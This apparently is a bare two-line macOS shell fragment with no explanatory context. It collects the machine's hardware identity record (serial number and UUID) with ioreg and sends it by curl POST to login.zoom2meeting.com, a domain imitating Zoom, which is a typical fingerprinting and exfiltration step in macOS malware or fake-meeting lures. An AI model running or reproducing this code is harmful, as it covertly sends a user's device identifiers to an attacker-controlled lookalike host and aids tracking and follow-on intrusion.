conf=$(ioreg -ad2 -c IOPlatformExpertDevice)
curl -d $conf http://login.zoom2meeting.com
